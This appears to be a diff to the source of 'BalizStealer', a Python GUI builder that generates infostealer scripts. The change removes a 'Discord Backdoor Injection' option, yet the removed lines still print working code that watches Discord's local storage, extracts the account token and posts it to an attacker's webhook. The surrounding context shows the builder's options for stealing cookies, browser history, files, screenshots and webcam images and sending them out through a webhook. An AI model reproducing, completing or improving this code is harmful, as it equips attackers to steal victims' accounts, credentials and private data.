@@ -20,12 +20,11 @@ from Crypto.Cipher import AES
 import shutil
 import threading
 from http.server import SimpleHTTPRequestHandler, HTTPServer
-from watchdog.observers import Observer
-from watchdog.events import FileSystemEventHandler
-import time
 
 ctk.set_appearance_mode("dark")
 ctk.set_default_color_theme("dark-blue")
+
+
 
 class BalizStealer(ctk.CTk):
     def __init__(self):
@@ -126,7 +125,6 @@ class BalizStealer(ctk.CTk):
             "History": ctk.BooleanVar(),
             "Cookies": ctk.BooleanVar(),
             "Common Files": ctk.BooleanVar(),
-            "Discord Backdoor Injection": ctk.BooleanVar()
         }
 
         container = ctk.CTkFrame(self, fg_color="#2B2B2B")
@@ -163,7 +161,7 @@ class BalizStealer(ctk.CTk):
                 "Screenshot", "Webcam Screen"
             ],
             "Discord & Misc": [
-                "Kill Discord Client", "Discord Token", "Downloads List", "Files on Desktop", "Discord Backdoor Injection"
+                "Kill Discord Client", "Discord Token", "Downloads List", "Files on Desktop"
             ]
         }
 
@@ -211,6 +209,7 @@ class BalizStealer(ctk.CTk):
             else:
                 checkbox.configure(fg_color="#2B2B2B", text_color="white")
 
+
     def test_webhook(self):
         url = self.webhook_entry.get()
         if not url.startswith("http"):
@@ -255,7 +254,7 @@ class BalizStealer(ctk.CTk):
     def create_script_content(self, webhook, options):
         script_parts = []
 
-        script_parts.append(f"""
+        script_parts.append("""
 import requests
 import platform
 import socket
@@ -275,11 +274,8 @@ from Crypto.Cipher import AES
 import shutil
 import threading
 from http.server import SimpleHTTPRequestHandler, HTTPServer
-from watchdog.observers import Observer
-from watchdog.events import FileSystemEventHandler
-import time
 
-webhook = '{webhook}'
+webhook = '{}'
 
 def send_embed(title, fields):
     embed = {{
@@ -291,7 +287,7 @@ def send_embed(title, fields):
         requests.post(webhook, json={{"embeds": [embed]}})
     except Exception as e:
         print(f"Error sending embed: {{e}}")
-""")
+""".format(webhook))
 
         if "System Info" in options:
             script_parts.append("""
@@ -719,57 +715,6 @@ def send_common_files():
     send_embed("Common Files", [{{"name": "Common Files", "value": files, "inline": False}}])
 """)
 
-        if "Discord Backdoor Injection" in options:
-            script_parts.append("""
-class DiscordFileHandler(FileSystemEventHandler):
-    def __init__(self, webhook_url):
-        self.webhook_url = webhook_url
-
-    def on_modified(self, event):
-        if event.src_path.endswith('Local Storage\\\\leveldb'):
-            print(f"Detected change in {event.src_path}")
-            self.send_updated_info()
-
-    def send_updated_info(self):
-        updated_token = self.extract_discord_token()
-        updated_password = self.extract_discord_password()
-        send_embed("Discord Update", [
-            {"name": "Updated Token", "value": updated_token, "inline": False},
-            {"name": "Updated Password", "value": updated_password, "inline": False}
-        ])
-
-    def extract_discord_token(self):
-        path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Discord", "Local Storage", "leveldb")
-        if not os.path.exists(path):
-            return None
-        for file_name in os.listdir(path):
-            if file_name.endswith(".log") or file_name.endswith(".ldb"):
-                with open(os.path.join(path, file_name), "r", encoding="utf-8", errors="ignore") as file:
-                    for line in file:
-                        if "token" in line and "}" in line:
-                            parts = line.split('"token": "')
-                            if len(parts) > 1:
-                                token_part = parts[1].split('"')[0]
-                                return token_part
-        return None
-
-    def extract_discord_password(self):
-        return "Password extraction not implemented"
-
-def monitor_discord_files(webhook_url):
-    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Discord")
-    event_handler = DiscordFileHandler(webhook_url)
-    observer = Observer()
-    observer.schedule(event_handler, path, recursive=True)
-    observer.start()
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        observer.stop()
-    observer.join()
-""")
-
         script_parts.append("""
 if __name__ == "__main__":
 """)
@@ -815,8 +760,7 @@ if __name__ == "__main__":
                 script_parts.append("    send_cookies()\n")
             elif option == "Common Files":
                 script_parts.append("    send_common_files()\n")
-            elif option == "Discord Backdoor Injection":
-                script_parts.append("    monitor_discord_files(webhook)\n")
+            
 
         return ''.join(script_parts)
 
